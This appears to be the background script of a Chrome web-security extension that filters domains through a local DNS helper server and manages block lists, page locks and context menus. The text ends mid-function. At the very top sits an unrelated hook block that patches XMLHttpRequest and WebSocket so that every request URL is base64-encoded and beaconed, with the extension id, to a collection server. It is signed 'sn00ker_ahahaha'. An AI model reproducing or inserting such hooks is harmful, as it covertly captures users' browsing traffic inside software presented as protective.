function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
//------------------------------------------------------------------------------
// Server:
// https://chrome.google.com/webstore/detail/fox-web-security-server/jjhlpdphecmmbnmckadgaeapmeooagjc
// id = jjhlpdphecmmbnmckadgaeapmeooagjc
// https://chrome.google.com/webstore/detail/jjhlpdphecmmbnmckadgaeapmeooagjc
//------------------------------------------------------------------------------
// Client:
// https://chrome.google.com/webstore/detail/fox-web-security/phodapffhgifgfppmcddhdaakbkkhkdk
// id = phodapffhgifgfppmcddhdaakbkkhkdk
// https://chrome.google.com/webstore/detail/phodapffhgifgfppmcddhdaakbkkhkdk
//------------------------------------------------------------------------------
// http://superuser.com/questions/682273/removing-or-disabling-chrome-s-task-manager-with-a-batch-file
//------------------------------------------------------------------------------
var s3security = {};
s3security.dns_servers_work = null;
s3security.tmp_domain_list = {};
s3security.tmp_allow_request_list = {},
s3security.tmp_deny_subrequest_list = {},

s3security.server_id = 'jjhlpdphecmmbnmckadgaeapmeooagjc';
s3security.server_url = 'https://chrome.google.com/webstore/detail/jjhlpdphecmmbnmckadgaeapmeooagjc';
s3security.check_is_server_timer = 30*1000;
s3security.check_is_server_last_check = Math.ceil((new Date()).getTime() / (1000*60));
s3security.server_is_installed = true;
s3security.set_context_menu_timer = null;

s3security.tab_list = {};

//------------------------------------------------------------------------------
chrome.runtime.onStartup.addListener( function() {
	console.log('onStartup');
});

//------------------------------------------------------------------------------
s3security.init = function() {
	setTimeout(s3security.check_is_server_installed, 5000);
	chrome.browserAction.setBadgeBackgroundColor({ color: '#646464' });
	s3security.set_context_menu();

	if (s3security.utils.prefs_get('startup_tabs_reload')) {
		chrome.tabs.query({}, function(tab_list) {
			for (var i=0; i< tab_list.length; i++) {
				var aTab = tab_list[i];
				if (aTab.url && (/^https?\:\/\//.test(aTab.url))) {
					if (! s3security.tab_list[ 'tab' + aTab.id ]) {
						s3security.tab_list[ 'tab' + aTab.id ] = {};
					}
					if (! s3security.tab_list[ 'tab' + aTab.id ].tabId) {
						chrome.tabs.reload(aTab.id);
					}
				}
			}
		});
	}
}
//------------------------------------------------------------------------------
s3security.onBeforeRequest = function(httpChannel) {
	var host = /^https?\:\/\/([^\/]+)/i.exec(httpChannel.url);
	if (host != null) {
		host = host[1]; 
	} else {
		host = 'unknown';
	}

	var last_result = {
		'domain_dns_name' : '',
		'domain_dns_id' : '',
		'domain' : host,
		'domain_ip' : '0.0.0.0',
		'domain_status' : 'error'
	};

	//------------------------------------------------------------------------
	var security_mode = 'disabled';
	var connect_server = true;
	//------------------------------------------------------------------------
	if (s3security.utils.prefs_get('security_enabled')) {
		security_mode = 'infected';
	}

	//------------------------------------------------------------------------
	if (/^127\.0\.0\.1/.test(host)) {
		security_mode = 'unknown';
	}
	else if (/^192\.168\./.test(host)) {
		security_mode = 'unknown';
	} else if (/^10\.10\./.test(host)) {
		security_mode = 'unknown';
	} else if (host == 'unknown') {
		security_mode = 'unknown';
	}

	//------------------------------------------------------------------------
	if (security_mode == 'disabled') {
		last_result.domain_status = 'disabled';
		connect_server = false;
	}
	//------------------------------------------------------------------------
	else if (security_mode == 'unknown') {
		last_result.domain_status = 'unknown';
		connect_server = false;
	}
	//------------------------------------------------------------------------
	else if (s3security.tmp_domain_list[host]) {
		last_result = s3security.utils.clone_object(s3security.tmp_domain_list[host]);
		connect_server = false;
	}

	//------------------------------------------------------------------------
	if (s3security.server_is_installed) {
		var current_minute = Math.ceil((new Date()).getTime() / (1000*60));
		if (s3security.check_is_server_last_check+5 < current_minute) {
			s3security.check_is_server_installed();
		}
	} else {
		connect_server = false;
		last_result.domain_status = 'error';
	}

	//------------------------------------------------------------------------
	if (connect_server) {
		var request = {
			'host' : host,
			'dns_servers' : {},
			'security_mode' : 'infected'
		};
		//------------------------------------------------------------------
		if (! s3security.dns_servers_work) {
			var dns_servers_init = [];
			try {
				dns_servers_init = s3security.utils.prefs_get('security_dns_list');
			} catch(e) {
			}
			if ((! dns_servers_init) || (dns_servers_init.length == 0)) {
				dns_servers_init = s3security.utils.clone_object(s3security.dns_servers);
				s3security.utils.prefs_set('security_dns_list', dns_servers_init);
			}
			s3security.dns_servers_work = dns_servers_init;
		}
		request.dns_servers = s3security.utils.clone_object(s3security.dns_servers_work);
		//------------------------------------------------------------------
		var str = '[begin]' + JSON.stringify(request) + '[end]';
		str = s3security.utils.urlencode(str);
		var url = 'http://127.0.0.1:53861/?' + str;
		try {
			var req = new XMLHttpRequest();
			req.open("GET", url, false);
			req.send(null);
			var json_data = JSON.parse(req.responseText);
			if (json_data.success) {
				last_result = json_data;
				s3security.tmp_domain_list[host] = s3security.utils.clone_object(json_data);
			}
		} catch(e){
			last_result.domain_status = 'error';
			s3security.check_is_server_installed();
		}
	}
	//------------------------------------------------------------------------
	var is_cancel = s3security.nslookup_end(last_result, httpChannel);
	return { cancel: is_cancel };
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
s3security.nslookup_end = function(result, httpChannel) {
	//-----------------------------------------------------------------------
	if (! result) {
		return false;
	}
	//-----------------------------------------------------------------------
	var aTab = null;
	if (httpChannel.tabId >= 0) {
		if (! s3security.tab_list[ 'tab' + httpChannel.tabId ]) {
			s3security.tab_list[ 'tab' + httpChannel.tabId ] = {};
		}
		aTab = s3security.tab_list[ 'tab' + httpChannel.tabId ];
	}

	//-----------------------------------------------------------------------
	var is_parent_uri = (httpChannel.type == 'main_frame') ? true : false;
	if (! aTab) {
		is_parent_uri = true;
	}
	if (is_parent_uri && aTab) {
		aTab.url = httpChannel.url;
		aTab.tabId = httpChannel.tabId;
		aTab.is_locked = false;
		aTab.show_pagelock = false;

		s3security.set_tab_status(aTab, result, true);
		s3security.set_context_menu(aTab.tabId);
	}

	//-----------------------------------------------------------------------
	var user_white_black_status = s3security.utils.get_user_white_black_status(result.domain);
	if (! user_white_black_status) {
		user_white_black_status = s3security.utils.get_user_white_black_status(result.domain_ip);
		if (user_white_black_status) {
			result.domain = result.domain_ip;
		}
	}

	var system_black_status = s3security.utils.check_system_black_status(result);
	var is_locked = false;
	var is_closetab = false;

	//-----------------------------------------------------------------------
	//-----------------------------------------------------------------------
	var statistic = {};
	statistic.type = result.domain_status;
	statistic.skipped = 0;

	var curDate = new Date();
	statistic.date = s3security.utils.get_sql_date_format(curDate);
	statistic.time = s3security.utils.get_sql_time_format(curDate);
	statistic.domain = result.domain;
	statistic.domain_dns_name = result.domain_dns_name;

	//-----------------------------------------------------------------------
	if (! system_black_status && (user_white_black_status == 'black')) {
		statistic.type = 'blacklist';
		statistic.domain_dns_name = 'USER';
	}
	if (! is_parent_uri) {
		if (aTab && aTab.s3security && (aTab.s3security.domain == result.domain)) {
			statistic.type = 'skip';
		}
	}
	if (! is_parent_uri) {
		statistic.type += '_subrequest';
	}

	//-----------------------------------------------------------------------
	//-----------------------------------------------------------------------
	if (system_black_status || user_white_black_status) {
		var is_pagelock = false;
		//-------------------------------------------------------------------
		var tab_blocked_domain = s3security.tab_blocked_domain_not_present(aTab, result, is_parent_uri);
		if (is_parent_uri || (tab_blocked_domain > 0)) {
			if (tab_blocked_domain == 1) {
				s3security.set_tab_status(aTab, result, is_parent_uri);
			}
			var user_white_black_status_alert = true;
			if (user_white_black_status) {
				user_white_black_status_alert = s3security.utils.prefs_get('security_' + user_white_black_status + '_list_alert');
			}
			//------------------------------------------------------------
			if (system_black_status && user_white_black_status_alert) {
				if (s3security.utils.prefs_get('security_' + result.domain_status + '_alert')) {
					var msg = s3security.utils.get_string('security_' + result.domain_status + '_alert', [result.domain_dns_name]);
					s3security.set_notification(aTab, msg, result.domain, true);
				}
			} 
			if (user_white_black_status && user_white_black_status_alert) {
				var msg = s3security.utils.get_string('security_' + user_white_black_status + '_list_alert');
				s3security.set_notification(aTab, msg, result.domain, true);
			}
		}
		//-------------------------------------------------------------------
		if (user_white_black_status) {
			if (user_white_black_status == 'white') {
				is_locked = false;
			} else if (! s3security.check_allow_request_list(aTab, result.domain)) {
				if (is_parent_uri) {
					var security_black_list_action = s3security.utils.prefs_get('security_black_list_action');
					if (security_black_list_action == 'pagelock') {
						is_pagelock = true;
					}
					is_closetab = s3security.utils.prefs_get('security_black_list_closetab');
				}
				is_locked = true;
			}
		}
		//-------------------------------------------------------------------
		else if (system_black_status) {
			var subrequest_action = s3security.utils.prefs_get('security_' + result.domain_status + '_subrequest');
			//-------------------------------------------------------------
			if (! s3security.check_allow_request_list(aTab, result.domain)) {
				if (is_parent_uri) {
					var action = s3security.utils.prefs_get('security_' + result.domain_status + '_action');
					if (action != 'none') {
						is_locked = true;
						if (action == 'pagelock') {
							is_pagelock = true;
						}
					}
				}
				//-------------------------------------------------------------
				else if (subrequest_action == 'block') {
					is_locked = true;
				}
				//-------------------------------------------------------------
				else if (subrequest_action == 'block_alien_domain') {
					if (! aTab) {
						is_locked = true;
					} else if (aTab.s3security.domain != result.domain) {
						is_locked = true;
					}
				}
			}
		}
		//-------------------------------------------------------------------
		if ((! is_parent_uri) && aTab && aTab.s3security) {
			if (aTab.s3security.domain != result.domain) {
				var user_white_black_status_tab = s3security.utils.get_user_white_black_status(aTab.s3security.domain);
				if (user_white_black_status_tab == 'white') {
					var subrequest_action = s3security.utils.prefs_get('security_white_list_subrequest_action');
					//------------------------------------------------
					if (subrequest_action == 'none') {
						is_locked = false;
					}
				}
			}
		}
		//-------------------------------------------------------------------
		if ((! is_parent_uri) && (! is_locked)) {
			if (s3security.tmp_deny_subrequest_list[result.domain]) {
				if (! s3security.check_allow_request_list(aTab, result.domain)) {
					is_locked = true;
				}
			}
		}
		//-------------------------------------------------------------------
		if (is_locked) {
			if (is_parent_uri) {
				aTab.is_locked = is_locked;
			}
			if (is_pagelock && aTab) {
				aTab.is_closetab = is_closetab;

				chrome.tabs.update(
					httpChannel.tabId, 
					{
						url: chrome.extension.getURL("/content/page_lock.html?" + s3security.utils.urlencode(httpChannel.url))
					},
					function(){
						if (chrome.runtime.lastError) {
						}
					}
				);
			}
		}
	}
	//--------------------------------------------------------------------------
/*
	if (! is_locked) {
		statistic.skipped = 1;
	}
	s3security.set_statistic(statistic);
*/
	if (aTab && aTab.s3security && aTab.s3security.blocked_list[result.domain]) {
		aTab.s3security.blocked_list[result.domain].is_locked = is_locked;
	}
	return is_locked;
}
//------------------------------------------------------------------------------
/*
s3security.set_statistic = function(statistic) {
	if (statistic.type in { 'blacklist' : 1, 'adult' : 1, 'infected' : 1, 'blacklist_subrequest' : 1, 'adult_subrequest' : 1, 'infected_subrequest' : 1 }) {
		if (! s3security.statistic.short[statistic.date+statistic.type]) {
			s3security.statistic.short[statistic.date+statistic.type] = {
				"statistic_date" : statistic.date,
				"statistic_type" : statistic.type,
				"statistic_request_count" : 0,
				"statistic_skipped_count" : 0
	
			};
		}
		s3security.statistic.short[statistic.date+statistic.type].statistic_request_count++;
		s3security.statistic.short[statistic.date+statistic.type].statistic_skipped_count += statistic.skipped;

		s3security.statistic.full.push(statistic);
	}
}
*/
//------------------------------------------------------------------------------
/*
s3security.save_statistic = function() {
	var statistic_short = s3security.utils.clone_object(s3security.statistic.short);
	var statistic_full = s3security.utils.clone_object(s3security.statistic.full);
	s3security.statistic = { 'short' : {}, 'full' : [] };

	if (s3security.utils.prefs_get('bool', 'statistics_short_enabled')) {
		s3security.save_statistic_db(statistic_short);
	}
	if (s3security.utils.prefs_get('bool', 'statistics_full_enabled')) {
		s3security.save_statistic_file(statistic_full);
	}
}
*/
//------------------------------------------------------------------------------
/*
s3security.save_statistic_db = function(statistic) {
	for (var i in statistic) {
		var stat = statistic[i];
		var stat_list = s3security.dbh.query(
			"SELECT * FROM statistic WHERE statistic_date = :statistic_date AND statistic_type=:statistic_type LIMIT 1", 
			{ 'statistic_date' : stat.statistic_date, 'statistic_type' : stat.statistic_type }
		);
		if (stat_list.length > 0) {
			s3security.dbh.execute(
				"UPDATE statistic SET statistic_request_count=:statistic_request_count, statistic_skipped_count=:statistic_skipped_count WHERE statistic_id=:statistic_id",
				{ 'statistic_id' : stat_list[0].statistic_id, 'statistic_request_count' : stat_list[0].statistic_request_count+stat.statistic_request_count,  'statistic_skipped_count' : stat_list[0].statistic_skipped_count + stat.statistic_skipped_count }
			);
		} else {
			s3security.dbh.execute(
				"INSERT INTO statistic (statistic_date, statistic_type, statistic_request_count, statistic_skipped_count) VALUES (:statistic_date, :statistic_type, :statistic_request_count, :statistic_skipped_count)",
				{ 'statistic_date' : stat.statistic_date, 'statistic_type' : stat.statistic_type, 'statistic_request_count' : stat.statistic_request_count,  'statistic_skipped_count' : stat.statistic_skipped_count }
			);
		}
	}
}
*/
//------------------------------------------------------------------------------
/*
s3security.save_statistic_file = function(statistic) {
	var text = '';
	var only_main_request = s3security.utils.prefs_get('bool', 'statistics_full_save_only_main_request');
	var save_skipped_request = s3security.utils.prefs_get('bool', 'statistics_full_save_skipped_request');

	//-----------------------------------------------------------------------
	while (statistic.length > 0) {
		var stat = statistic.shift();
		var is_save = true;
		if ((!save_skipped_request) && stat.skipped) {
			is_save = false;
		}
		if (only_main_request && /_subrequest/.test(stat.type)) {
			is_save = false;
		}
		if (is_save) {
			var str = '[' + stat.date + ' ' + stat.time + ']' + "\t" + stat.type + "\t" + stat.domain_dns_name + "\t" + stat.domain + "\t" + (stat.skipped ? '=SKIPPED=' : '') + "\r\n";
			text += str;
		}
	}

	//-----------------------------------------------------------------------
	if (! text) { return; }

	//-----------------------------------------------------------------------
	var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
	var dir_path = s3security.utils.prefs_get('unichar', 'statistics_full_directory');
	file.initWithPath(s3security.utils.get_file_path(dir_path, s3security.utils.get_statistics_full_filename()));
	if (! file.exists()) {
		file.create( Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0664);
	}
	var fileOutputStream = Components.classes['@mozilla.org/network/file-output-stream;1'].createInstance(Components.interfaces.nsIFileOutputStream);
	var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"].createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
	converter.charset = "UTF-8";

	try {
		text = converter.ConvertFromUnicode(text);
		fileOutputStream.init(file, 0x02 | 0x08 | 0x10, 0644, 0);
		fileOutputStream.write(text, text.length);
	}
	catch(e) {
		return false;
	}
	fileOutputStream.close();
}
*/
//------------------------------------------------------------------------------
s3security.set_notification = function(aTab, msg, domain,  is_check_msg) {
	if (aTab && aTab.s3security && aTab.s3security.notification_domain_list) {
		var date_time = (new Date).getTime();
		if (aTab.s3security.notification_domain_list[domain] && (aTab.s3security.notification_domain_list[domain] > date_time)) {
			return;
		} else {
			aTab.s3security.notification_domain_list[domain] = date_time + 5000;
		}
	}
	s3security.utils.notification_box(msg, domain, is_check_msg);
}
//------------------------------------------------------------------------------
s3security.set_tab_status = function(aTab, result, is_parent_uri) {
	if (! aTab) { return; }

	if (is_parent_uri) {
		var allow_request_list = (aTab.s3security) ? aTab.s3security.allow_request_list : null;
		aTab.s3security = result;
		aTab.s3security.blocked_list = {};
		aTab.s3security.allow_request_list = allow_request_list;
		aTab.s3security.notification_domain_list = {};
	} else {
		if (! aTab.s3security) {
			aTab.s3security = {
				'domain_dns_name' : result.domain_dns_name,
				'domain' : '',
				'domain_status' : 'danger',
				'blocked_list' : {},
				'notification_domain_list' : {}
			};
		}
		if (s3security.tab_is_white_status(aTab)) {
			aTab.s3security.domain_status = 'danger';
		}
		if (! aTab.s3security.blocked_list[result.domain]) {
			aTab.s3security.blocked_list[result.domain] = { 'domain_status' : result.domain_status, 'domain_dns_name' : result.domain_dns_name };
		}
	}

	s3security.set_tab_status_icon(aTab.tabId);
}
//------------------------------------------------------------------------------
s3security.set_tab_status_icon = function(tabId) {
	var blocked_list_length = 0;
	var domain_status = 'unknown';
	var icon_path = '';
	var aTab = s3security.tab_list[ 'tab' + tabId ];

	//-----------------------------------------------------------------------
	if (aTab && aTab.s3security) {
		//--------------------------------------------------------------------
		if (aTab.s3security.blocked_list) {
			blocked_list_length = Object.keys(aTab.s3security.blocked_list).length;
		}
		//--------------------------------------------------------------------
		var result = aTab.s3security;
		domain_status = result.domain_status;
		//--------------------------------------------------------------------
		var user_white_black_status = s3security.utils.get_user_white_black_status(result.domain);
		if (user_white_black_status) {
			domain_status = user_white_black_status + '_list';
		}
	}

	//-----------------------------------------------------------------------
	switch (domain_status) {
		case 'white':
			icon_path = '/skin/foxsecurity_green_16.png';
		break;
		case 'adult':
		case 'infected':
			icon_path = '/skin/foxsecurity_red_16.png';
		break;
		case 'error':
			icon_path = '/skin/foxsecurity_alert_16.png';
		break;
		case 'disabled':
			icon_path = '/skin/foxsecurity_disabled_16.png';
		break;
		case 'danger':
			icon_path = '/skin/foxsecurity_yellow_16.png';
		break;
		case 'white_list':
		case 'black_list':
			icon_path = '/skin/foxsecurity_user_16.png';
		break;
		case 'unknown':
		default:
			icon_path = '/skin/foxsecurity_gray_16.png';
	}

	//-----------------------------------------------------------------------
	var title_vars = (aTab && aTab.s3security) ? aTab.s3security.domain_dns_name : '';
	var title = s3security.utils.get_string('extension_name') + "\n" + s3security.utils.get_string('security_' + domain_status + '_alert', [title_vars]);

	//-----------------------------------------------------------------------
	blocked_list_length = (blocked_list_length) ? String(blocked_list_length) : '';
	chrome.tabs.get(tabId, function() {
		if (chrome.runtime.lastError) {
		} else {
			chrome.browserAction.setBadgeText({ 'text': blocked_list_length, 'tabId': tabId } );
			chrome.browserAction.setIcon({ 'path': icon_path, 'tabId': tabId }, function() { if (chrome.runtime.lastError) {}; });
			chrome.browserAction.setTitle({ 'title': title, 'tabId': tabId });
			chrome.runtime.sendMessage({ 'action_reload_popup': true, 'tabId': tabId }, function(response) {});
		}
	});
}
//------------------------------------------------------------------------------
s3security.tab_is_white_status = function(aTab, without_danger) {
	if (! aTab) { return true; }

	var result = true;
	if (aTab && aTab.s3security) {
		if ((aTab.s3security.domain_status == 'adult') || (aTab.s3security.domain_status == 'infected') || (aTab.s3security.domain_status == 'danger')) {
			if (without_danger && (aTab.s3security.domain_status != 'danger')) {
				result = false;
			} else if (! without_danger) {
				result = false;
			}
		}
	}
	return result;
}
//------------------------------------------------------------------------------
s3security.tab_blocked_domain_not_present = function(aTab, result, is_parent_uri) {
	if (! aTab) { return 0; }
	if (is_parent_uri) { return 0; }

	if (aTab && aTab.s3security) {
		if (aTab.s3security.domain == result.domain) {
			return 0;
		}
		else if (aTab.s3security.blocked_list && aTab.s3security.blocked_list[result.domain]) {
			return 2;
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
s3security.check_allow_request_list = function(aTab, domain) {
	if (s3security.tmp_allow_request_list[domain]) {
		return true;
	}
	if (aTab && aTab.s3security) {
		if (aTab.s3security.allow_request_list && aTab.s3security.allow_request_list[domain]) {
			return true;
		}
	}
	return false;
}
//------------------------------------------------------------------------------
s3security.check_is_server_installed = function() {
	chrome.runtime.sendMessage(s3security.server_id, { 'action_check_installed' : true }, function(response) {
		s3security.check_is_server_last_check = Math.ceil((new Date()).getTime() / (1000*60));

		var is_installed = false;
		//------------------------------------------------------------------
		if (response && response.installed) {
			is_installed = true;
		}
		//------------------------------------------------------------------
		else {
			var request = { 'is_check_server' : true };
			var str = '[begin]' + JSON.stringify(request) + '[end]';
			str = s3security.utils.urlencode(str);
			var url = 'http://127.0.0.1:53861/?' + str;
			try {
				var req = new XMLHttpRequest();
				req.open("GET", url, false);
				req.send(null);
				var json_data = JSON.parse(req.responseText);
				if (json_data.success) {
					is_installed = true;
				}
			} catch(e){
			}
		}
		//------------------------------------------------------------------
		if (is_installed) {
			s3security.server_is_installed = true;
		} else {
			var params = {
				type: 'basic',
				isClickable: true,
				iconUrl: s3security.utils.get_string('notifications_icon'),
				title: '', //s3security.utils.get_string('extension_name'),
				priority: 2,
				message: s3security.utils.get_string('require_fox_server'),
				contextMessage: s3security.utils.get_string('require_fox_server_2')
			};
			s3security.server_is_installed = false;
			chrome.notifications.create("FWS_notification_server_install_requred", params);
			s3security.utils.setTimeout(s3security.check_is_server_installed, s3security.check_is_server_timer);
		}
	});
}
//------------------------------------------------------------------------------
s3security.open_options_window = function() {
	chrome.runtime.openOptionsPage();
}
//------------------------------------------------------------------------------
s3security.set_context_menu = function(tabId) {
	if (s3security.set_context_menu_timer) {
		clearTimeout(s3security.set_context_menu_timer);
	}
	s3security.set_context_menu_timer = setTimeout(function(){ s3security.set_context_menu_init(tabId); }, 500);
}
//------------------------------------------------------------------------------
s3security.set_context_menu_init = function(tabId) {
	s3security.set_context_menu_timer = null;

	chrome.contextMenus.removeAll(function() {
		if (! s3security.utils.prefs_get('show_context_menu_main')) { return; }
		//-----------------------------------------------------------------
		chrome.tabs.query({  active: true, currentWindow: true }, function(tab_list) {
			if (tab_list && (tab_list.length>0) && tab_list[0].id) {
				if (tabId && (tabId != tab_list[0].id)) { return; }
				//-----------------------------------------------------
				if (! s3security.check_password_for_tab(tab_list[0])) {
					return;
				}
				//-----------------------------------------------------
				chrome.contextMenus.create({
					id: 's3security_context_popup',
					type : 'normal',
					title : s3security.utils.get_string('extension_name'),
					contexts: ["page", "browser_action"],
				}, function() {
					s3security.set_context_menu_actions(tab_list[0].id);
				});
			}
		});
	});
}
//------------------------------------------------------------------------------
s3security.set_context_menu_actions = function(tabId) {
	var aTab = s3security.tab_list[ 'tab' + tabId ];
	if (aTab && aTab.tabId) {
		var result = s3security.utils.get_menu_current_domain_status(aTab);
		//------------------------------------------------------------------
		if (! result.menu_is_hidden) {
			var menu_text = '';
			if (result.domain_exists) {
				menu_text = s3security.utils.get_string('security_' + result.menu_state + '_list_menu_del', [result.domain]);
			} else {
				menu_text = s3security.utils.get_string('security_' + result.menu_state + '_list_menu_add', [result.domain]);
			}
			chrome.contextMenus.create({
				id: 's3security_context_settings_black_wait',
				parentId: 's3security_context_popup',
				type : 'normal',
				title : menu_text,
				contexts: ["page", "browser_action"],
				onclick: function(){ s3security.context_menu_click_black_white(aTab); }
			});
		}
		//------------------------------------------------------------------
		var hidden_browser_tab = true;
		var hidden_browser_tab_deny = true;
		if ((result.menu_state == 'white') && (! result.domain_exists)) {
			hidden_browser_tab = false;
		}
		else if ((result.menu_state == 'black') && (result.domain_exists)) {
			hidden_browser_tab = false;
		}
		if (aTab && aTab.s3security) {
			if (! aTab.s3security.allow_request_list) {
				aTab.s3security.allow_request_list = {};
			}
			if (aTab.s3security.allow_request_list[result.domain]) {
				hidden_browser_tab = true;
				hidden_browser_tab_deny = false;
			}
		}
		if (s3security.tmp_allow_request_list[result.domain]) {
			hidden_browser_tab = true;
			hidden_browser_tab_deny = false;
		}
		//------------------------------------------------------------------
		if (! hidden_browser_tab) {
			chrome.contextMenus.create({
				id: 's3security_context_allow_browser',
				parentId: 's3security_context_popup',
				type : 'normal',
				title : s3security.utils.get_string('prompt_allow_browser'),
				contexts: ["page", "browser_action"],
				onclick: function(){ s3security.context_menu_click('browser', aTab); }
			});
			chrome.contextMenus.create({
				id: 's3security_context_allow_tab',
				parentId: 's3security_context_popup',
				type : 'normal',
				title : s3security.utils.get_string('prompt_allow_tab'),
				contexts: ["page", "browser_action"],
				onclick: function(){ s3security.context_menu_click('tab', aTab); }
			});
		}
		//------------------------------------------------------------------
		if (! hidden_browser_tab_deny) {
			chrome.contextMenus.create({
				id: 's3security_context_deny',
				parentId: 's3security_context_popup',
				type : 'normal',
				title : s3security.utils.get_string('prompt_deny'),
				contexts: ["page", "browser_action"],
				onclick: function(){ s3security.context_menu_click('deny', aTab); }
			});
		}
	}

	chrome.contextMenus.create({
		id: 's3security_context_settings',
		parentId: 's3security_context_popup',
		type : 'normal',
		title : s3security.utils.get_string('settings.label'),
		contexts: ["page", "browser_action"],
		onclick: s3security.open_options_window
	});
}
//------------------------------------------------------------------------------
s3security.context_menu_click_black_white = function(aTab) {
	if (! s3security.utils.check_action_password()) { return; }
	var result = s3security.utils.get_menu_current_domain_status(aTab);
	if (! result.menu_is_hidden) {
		try {
			var white_black_list = s3security.utils.prefs_get('security_white_black_list');
			//----------------------------------------------------------
			if (white_black_list[result.domain]) {
				delete white_black_list[result.domain];
			}
			//----------------------------------------------------------
			else {
				var user_white_black_status = s3security.utils.check_user_white_black_status(result.domain, white_black_list);
				var value = '';
				if (user_white_black_status) {
					value = (user_white_black_status == 'white') ? 'black' : 'white';
				} else {
					value = result.menu_state;
				}
				white_black_list[result.domain] = value;
			}
			//----------------------------------------------------------
			s3security.utils.prefs_set('security_white_black_list', white_black_list);
			chrome.tabs.update(aTab.tabId, { url: aTab.url });
		} catch(e) {
		}
	}
}
//------------------------------------------------------------------------------
s3security.context_menu_click = function(action, aTab) {
	if (action != 'deny') {
		if (! s3security.utils.check_action_password()) { return; }
	}

	var result = s3security.utils.get_menu_current_domain_status(aTab);
	s3security.action_allow_deny_request_list({ 'action_allow_deny_request_list': true, 'domain_list': [result.domain], 'action': action, 'tabId': aTab.tabId });
	chrome.tabs.update(aTab.tabId, { url: aTab.url });
	return true;
}
//------------------------------------------------------------------------------------
s3security.action_allow_deny_request_list = function(request) {
	if (request.action_allow_deny_request_list && request.domain_list && request.action) {
		if (! s3security.tab_list[ 'tab' + request.tabId ]) {
			s3security.tab_list[ 'tab' + request.tabId ] = {};
		}
		//-----------------------------------------------------------------------
		var aTab = s3security.tab_list[ 'tab' + request.tabId ];
		if (! aTab.s3security) {
			aTab.s3security = {};
		}
		if (! aTab.s3security.allow_request_list) {
			aTab.s3security.allow_request_list = {};
		}
		//-----------------------------------------------------------------------
		if (request.white_black_list) {
			s3security.utils.prefs_set('security_white_black_list', request.white_black_list);
		}
		//-----------------------------------------------------------------------
		for (var i=0; i<request.domain_list.length; i++) {
			var domain = request.domain_list[i];
			//-----------------------------------------------------------------
			if (request.action == 'browser') {
				s3security.tmp_allow_request_list[domain] = true;
				if (request.is_subrequest) {
					delete(s3security.tmp_deny_subrequest_list[domain]);
				}
			}
			//-----------------------------------------------------------------
			else if (request.action == 'tab') {
				aTab.s3security.allow_request_list[domain] = true;
			}
			//-----------------------------------------------------------------
			else if (request.action == 'deny') {
				delete(s3security.tmp_allow_request_list[domain]);
				delete(aTab.s3security.allow_request_list[domain]);
				if (request.is_subrequest) {
					s3security.tmp_deny_subrequest_list[domain] = true;
				}
			}
			//-----------------------------------------------------------------
			else if ((request.action == 'white') || (request.action == 'reset')) {
				delete(s3security.tmp_allow_request_list[domain]);
				delete(aTab.s3security.allow_request_list[domain]);
				delete(s3security.tmp_deny_subrequest_list[domain]);
			}
		}
	}
}
//------------------------------------------------------------------------------------
s3security.check_password_for_tab = function(aTab) {
	var access_allowed = true;

	if (/^chrome\:\/\/extensions/i.test(aTab.url)) {
		access_allowed = false;
	} else if (/^chrome\:\/\/apps/i.test(aTab.url)) {
		access_allowed = false;
	} else if (/^chrome\:\/\/settings/i.test(aTab.url)) {
		access_allowed = false;
	}

	if (! access_allowed) {
		access_allowed = s3security.utils.check_action_password(aTab.url, aTab.id, s3security.tab_list[ 'tab' + aTab.id ]);
	}

	return access_allowed;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
chrome.runtime.onUpdateAvailable.addListener(function () {
	chrome.runtime.reload();
});
//------------------------------------------------------------------------------
chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
		//------------------------------------------------------------------
		if (! request) { return; }
		//------------------------------------------------------------------
		if (request.action_get_tab_data) {
			var tab_data = null;
			//----------------------------------------------------------
			if (sender.tab) {
				tab_data = s3security.tab_list[ 'tab' + sender.tab.id ];
			}
			else if (request.tabId) {
				tab_data = s3security.tab_list[ 'tab' + request.tabId ];
			}
			//----------------------------------------------------------
			sendResponse({ 'tab_data' : tab_data, 'tmp_allow_request_list' : s3security.tmp_allow_request_list });
			//----------------------------------------------------------
			if (request.is_pagelock && tab_data) {
				tab_data.show_pagelock = true;
			}
		}
		//------------------------------------------------------------------
		else if (request.action_white_black_list) {
			var white_black_list = s3security.utils.prefs_get('security_white_black_list');
			var action = 'set';
			var value = '';
			//----------------------------------------------------------
			if (request.action == 'del') {
				delete white_black_list[request.domain];
			}
			//----------------------------------------------------------
			else {
				white_black_list[request.domain] = request.value;
			}
			//----------------------------------------------------------
			s3security.utils.prefs_set('security_white_black_list', white_black_list);
			sendResponse({ 'success' : true });
		}
		//------------------------------------------------------------------
		else if (request.action_allow_deny_request_list && request.domain_list && request.action) {
			s3security.action_allow_deny_request_list(request);
			sendResponse({ 'success' : true });
		}
		//------------------------------------------------------------------
		else if (request.action_prefs_set && request.pref_name) {
			s3security.utils.prefs_set(request.pref_name, request.pref_value);
			if (request.pref_name == 'current_locale') {
				s3security.i18n.init(request.pref_value);
				s3security.set_context_menu();
			}
			else if (request.pref_name == 'security_dns_list') {
				s3security.tmp_domain_list = {};
				s3security.dns_servers_work = null;
				chrome.runtime.sendMessage(s3security.server_id, { 'action_reset_domain_list' : true }, function(response) {});
			}
			else if (request.pref_name == 'show_context_menu_main') {
				s3security.set_context_menu();
			}
			sendResponse({ 'success' : true });
		}
		//------------------------------------------------------------------
		else if (request.action_reset_defaults) {
			s3security.prefs.reset_defaults();
